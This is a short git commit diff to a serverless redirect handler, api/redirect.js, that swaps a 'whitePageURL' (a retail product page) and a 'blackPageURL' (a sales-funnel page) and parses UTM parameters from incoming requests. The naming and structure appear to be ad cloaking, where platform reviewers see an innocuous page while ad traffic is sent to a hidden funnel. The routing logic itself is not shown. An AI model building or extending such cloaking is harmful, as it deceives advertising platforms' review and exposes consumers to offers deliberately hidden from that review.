56ae3bee487e81bd4ca46b0daf33f3ca43b236c6
Ahmadfarhan67 <123234895+Ahmadfarhan67@users.noreply.github.com>
2025-02-05 10:48:30 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://furorjeans.com/products/brown-baseball-cap-fac24-089";
-    const blackPageURL = "https://ifrxjwhbvb.myfunnelish.com/imbassd-1736979042571105-1738006308191131-1738511238414243";
+    const whitePageURL = "https://www.cougar.com.pk/products/mts3-24214";
+    const blackPageURL = "https://IFRXJwhbvB.myfunnelish.com/imbassd-1736979042571105-1738006308191131";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
